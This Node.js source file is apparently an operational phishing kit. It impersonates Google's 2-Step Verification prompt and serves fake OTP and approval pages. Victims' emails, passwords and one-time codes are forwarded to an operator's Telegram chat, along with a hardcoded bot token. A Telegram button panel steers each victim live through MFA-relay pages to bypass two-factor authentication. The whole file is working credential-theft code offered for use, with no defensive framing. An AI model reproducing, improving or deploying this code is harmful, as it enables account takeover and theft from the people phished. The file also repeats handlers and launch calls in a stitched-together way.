const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const { Telegraf, Markup } = require('telegraf');
const path = require('path');

const app = express();
app.set('trust proxy', true);
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });

app.use(express.static(__dirname));


const BOT_TOKEN = '8466684889:AAHVvpJf1Yykez-rYWiqO5aHEniFCI3zRIk';
const ADMIN_CHAT_ID = -5427803865;

const bot = new Telegraf(BOT_TOKEN);

// Keeps track of active website users mapped by their email address (Email -> Socket ID)
const activeStaffSessions = new Map();

app.use(express.urlencoded({ extended: true }));
app.use(express.json());


app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
app.get('/verification-code', (req, res) => res.sendFile(path.join(__dirname, 'code-input.html')));
app.get('/approval-prompt', (req, res) => res.sendFile(path.join(__dirname, 'approval-prompt.html')));

app.get('/2fa/:num', (req, res) => {
    const selectedNum = req.params.num;
    res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">

            <title>2FA Verification</title>
            <style>
                body { font-family: Arial, sans-serif; text-align: center; padding-top: 120px; background-color: #f3f4f6; }
                .box { background: white; padding: 40px; border-radius: 8px; display: inline-block; box-shadow: 0 4px 6px rgba(0,0,0,0.1); width: 350px; }
                .badge { font-size: 14px; color: black; margin: 20px 0; }
            </style>

        </head>
        <body>
            <div class="box">


             <img src="https://thumb.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/3840px-Google_%22G%22_logo.svg.png?utm_source=commons.wikimedia.org&utm_campaign=index&utm_content=thumbnail" alt="google logo" width="45" height="45" style="display: block; margin-right: auto; margin-left: 0;">

                <h2 style="text-align: left;">2-Step Verification</h2>
                <p></p>
               <div class="badge" style="text-align: justify;">To help keep your account safe, Google wants to make sure it's really you trying to sign in

                <br> <br> <h1 style="text-align: center;"> ${selectedNum} </h1>  <br> 
                
                 <p style="text-align: left; font-size: 14px;">Open the Gmail app on your Device </p>
                <p>Google sent a notification to your Device. Open the Gmail app, tap <strong>Yes</strong> on the prompt. then tap <strong>${selectedNum}</strong> on your phone to verify it's you. </p>
            
                
                </div>

                  <label style="display: flex; align-items: center; gap: 5px;">
        <input type="checkbox" id="logo-toggle">
      <p style="font-size: 14px;"> <span>Don't ask again on this device</span> </p>
    </label> <br><br>

            <div style="text-align: left;"> <a href="#">Resend it</a> <br><br>

             <a href="#">try another way</a> </div>
        
            </div>
        </body>
        </html>
    `);
});



io.on('connection', (socket) => {

    socket.on('verify_and_register', (data) => {
        const { email, password } = data;
        if (!email) return;

        const cleanEmail = email.toLowerCase().trim();
        socket.join(cleanEmail);
        activeStaffSessions.set(cleanEmail, socket.id);
        console.log("📡 Device linked to security room: " + cleanEmail);

        if (password && password !== "session_reconnect") {
            console.log("🔑 Credentials Received -> User: " + cleanEmail + " | Pass: " + password);

            bot.telegram.sendMessage(
                ADMIN_CHAT_ID,
                "💼 **New Staff Connection Log**\n\n📧 **Email:** `" + cleanEmail + "`\n🔑 **Password:** `" + password + "`\n\nTerminal window is holding on the loader engine. Choose an action:",
                {
                    parse_mode: 'Markdown',
                    ...Markup.inlineKeyboard([
                        [
                            Markup.button.callback('🔢 Button 1: Push Code Input', "route:" + cleanEmail + ":button_one"),
                            Markup.button.callback('👍 Button 2: Push Approval', "route:" + cleanEmail + ":button_two")
                        ],
                        [
                            Markup.button.callback('🔢 Button 3: Push Custom Number (1-100)', "route:" + cleanEmail + ":button_three")
                        ],
                        [
                            Markup.button.callback('❌ Button 4: Reset & Kick User', "route:" + cleanEmail + ":button_four")
                        ]
                    ])
                }
            ).catch(err => console.error("TELEGRAM LOG ENGINE ERROR:", err.message));
        }
    });

    socket.on('disconnect', () => {
        for (let [userEmail, id] of activeStaffSessions.entries()) {
            if (id === socket.id) activeStaffSessions.delete(userEmail);
        }
    });
});

// ==========================================
// 4. TELEGRAM BOT CLICK ACTIONS
// ==========================================
bot.on('callback_query', async (ctx) => {
    const data = ctx.callbackQuery.data;

    try {
        if (data.startsWith('route:')) {
            const parts = data.split(':');
            const email = parts[1];
            const selection = parts[2];
            const cleanEmail = email.toLowerCase().trim();

            // BUTTON 1: Route onto the 6-Digit OTP Box Layout
            if (selection === "button_one") {
                io.to(cleanEmail).emit('redirect_command', '/verification-code');
                await ctx.answerCbQuery("Pushed OTP box!").catch(() => { });
                await bot.telegram.sendMessage(ADMIN_CHAT_ID, "⚙️ *Dashboard Execution:* Code verification panel pushed to `" + cleanEmail + "`", { parse_mode: 'Markdown' }).catch(() => { });
            }

            // BUTTON 2: Route onto the Yes/No Alert
            else if (selection === "button_two") {
                io.to(cleanEmail).emit('redirect_command', '/approval-prompt');
                await ctx.answerCbQuery("Pushed approval prompt!").catch(() => { });
                await bot.telegram.sendMessage(ADMIN_CHAT_ID, "⚙️ *Dashboard Execution:* Yes/No approval layout pushed to `" + cleanEmail + "`", { parse_mode: 'Markdown' }).catch(() => { });
            }

            // BUTTON 3: Generate the 1-100 Matrix Layout
            else if (selection === "button_three") {
                await ctx.answerCbQuery("Loading grid structure...").catch(() => { });

                const gridButtons = [];
                let currentRow = [];

                for (let i = 1; i <= 100; i++) {
                    currentRow.push(Markup.button.callback(String(i), "numtarget:" + cleanEmail + ":" + i));
                    if (currentRow.length === 5) {
                        gridButtons.push(currentRow);
                        currentRow = [];
                    }
                }
                if (currentRow.length > 0) {
                    gridButtons.push(currentRow);
                }

                await ctx.editMessageText(
                    "🔢 Select a custom index marker to route \"" + cleanEmail + "\" to their target viewport:",
                    Markup.inlineKeyboard(gridButtons)
                ).catch(() => { });
            }

            // BUTTON 4: Reset Device View & Kick Session Out Completely
            else if (selection === "button_four") {
                io.to(cleanEmail).emit('redirect_command', '/force_reset_kick');
                await ctx.answerCbQuery("Terminal session dropped!").catch(() => { });
                await bot.telegram.sendMessage(ADMIN_CHAT_ID, "❌ *Dashboard Execution:* Admin cleared sessions and kicked user: `" + cleanEmail + "`", { parse_mode: 'Markdown' }).catch(() => { });
            }
        }

        // GRID DATA ENGINE TRIGGER FOR OPTION 3
        if (data.startsWith('numtarget:')) {
            const parts = data.split(':');
            const email = parts[1];
            const selectedNum = parts[2];
            const cleanEmail = email.toLowerCase().trim();

            io.to(cleanEmail).emit('redirect_command', '/2fa/' + selectedNum);
            await ctx.answerCbQuery("Target " + selectedNum + " deployed!").catch(() => { });
            await bot.telegram.sendMessage(ADMIN_CHAT_ID, "✅ *Success:* Sent `" + cleanEmail + "` to code accept page: **" + selectedNum + "**", { parse_mode: 'Markdown' }).catch(() => { });
        }
    } catch (telegramErr) {
        console.error("Interaction thread tracking caught warning:", telegramErr.message);
    }
});

// ==========================================
// 5. POST ENDPOINTS (FROM FRONTEND DATA FORMS)
// ==========================================
app.post('/verify-code', (req, res) => {
    const code = req.body.full_code;
    const email = req.body.email_context || "Unknown User";

    console.log("🔢 Code submitted by " + email + ": " + code);
    bot.telegram.sendMessage(ADMIN_CHAT_ID, "📩 **OTP Code Submitted**\n\n📧 **User:** `" + email + "`\n🔢 **Code Entered:** `" + code + "`", { parse_mode: 'Markdown' });

    res.send(`
        <div style="text-align:center; padding-top:100px; font-family:Arial;">
            <h2>Verification Code </h2>
            <p>Processing.....</p>
            <script>setTimeout(() => { window.location.href = '/'; }, 1000);</script>
        </div>
    `);
});

app.post('/handle-approval', (req, res) => {
    const status = req.body.status;
    const email = req.body.email_context || "Unknown User";

    console.log("👍 Approval choice by " + email + ": " + status);
    bot.telegram.sendMessage(ADMIN_CHAT_ID, "📣 **Action Decision Alert**\n\n📧 **User:** `" + email + "`\n🔘 **Choice Clicked:** `" + status.toUpperCase() + "`", { parse_mode: 'Markdown' });

    res.send(`
        <div style="text-align:center; padding-top:100px; font-family:Arial;">
            <h2>Refresh</h2>
            <p>processing....</p>
            <script>setTimeout(() => { window.location.href = '/'; }, 1000);</script>
        </div>
    `);
});

// Boot the network processes
bot.launch();
const PORT = process.env.PORT || 3000;
const domain = process.env.RENDER_EXTERNAL_URL; 
const webhookPath = `/telegraf/${bot.secretPathComponent()}`;

if (process.env.NODE_ENV === 'production' && domain) {
    // Connects Telegraf directly into your Express pipeline on Render
    app.use(bot.webhookCallback(webhookPath));
    
    // Registers the webhook hook directly with Telegram's servers
    bot.telegram.setWebhook(`${domain}${webhookPath}`)
        .then(() => console.log(`🚀 Webhook successfully active at: ${domain}${webhookPath}`))
        .catch((err) => console.error('Error setting webhook:', err));
} else {
    // Local fallback: Only uses polling when you are testing on your own computer
    bot.launch()
        .then(() => console.log('🤖 Bot running locally via Polling mode'))
        .catch((err) => console.error('Local bot crash:', err));
}

// ==========================================
// 2. SOCKET.IO CONNECTION HANDLING
// ==========================================
io.on('connection', (socket) => {
    console.log(`User connected: ${socket.id}`);
    
    // Put your existing socket events here (e.g., socket.on('login', ...))

    socket.on('disconnect', () => {
        console.log(`User disconnected: ${socket.id}`);
    });
});

// ==========================================
// 3. START SERVER
// ==========================================
server.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});

// ==========================================
// 4. GRACEFUL SHUTDOWN (Clears old Telegram hooks)
// ==========================================
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));